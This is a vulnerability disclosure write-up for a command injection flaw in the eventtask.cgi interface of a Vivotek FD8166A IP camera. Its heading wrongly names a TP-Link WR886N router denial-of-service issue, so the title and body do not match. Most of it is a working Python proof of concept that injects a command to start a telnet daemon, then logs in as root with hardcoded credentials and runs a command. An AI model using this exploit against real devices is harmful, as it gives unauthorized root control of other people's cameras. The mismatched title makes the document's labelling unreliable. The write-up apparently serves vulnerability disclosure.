# Tplink-wr886n-v6-cloud_config-device_legality_illegal-dos-analysis

Vender：vivotek  
Firmware version: FD8166A-VVTK-0204j 
Hardware version: FD8166A  
Exploit Author: ljzjsc  
Vendor Homepage: <https://www.vivotek.com/>  
Hardware Link: <https://www.vivotek.com/fd8166a>  

## Vul detail
eventtask.cgi is a cgi interface that can be accessed in the device and can be accessed directly in the browser.

![1706496909343](./vivotek-FD8166A-eventtask-analysis.assets/1706496909343.png)

There is a command injection function in eventtask.cgi. The attacker only needs to construct the response payload to execute the response function to achieve the effect of arbitrary execution of the command.

![1706497925920](./vivotek-FD8166A-eventtask-analysis.assets/1706497925920.png)

We construct the corresponding payload to achieve rebound shell, denial of service and other attacks.

![1706500233048](./vivotek-FD8166A-eventtask-analysis.assets/1706500233048.png)

## PoC
```python
import requests
import telnetlib

url = "http://192.168.1.107/cgi-bin/admin/eventtask.cgi?method=exec&file=telnetd%20-p%208999"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate",
    "Authorization": "Basic cm9vdDpsaTEwMTdydWk=",
    "Connection": "close",
    "Cookie": "webptzmode=continuous; activatedmode=digital; g_mode=1; viewsizemode=100; 4x3=false",
    "Upgrade-Insecure-Requests": "1"
}

response = requests.get(url, headers=headers)
print(response.status_code)
print(response.text)

tn = telnetlib.Telnet("192.168.1.107", 8999)
tn.read_until(b"login: ")
tn.write(b"root\n")
tn.read_until(b"Password: ")
tn.write(b"li1017rui\n")
response = tn.read_until(b"#")
tn.write(b"id\n")
response = tn.read_until(b"#")
print(response.decode('utf-8'))
```


[<video src="./vivotek-FD8166A-eventtask-analysis.assets/video.mp4"></video>](https://github.com/cwh031600/vivotek/assets/56186866/d908d933-22f0-4fc7-a3ea-5fa9766abf6e)https://github.com/cwh031600/vivotek/assets/56186866/d908d933-22f0-4fc7-a3ea-5fa9766abf6e
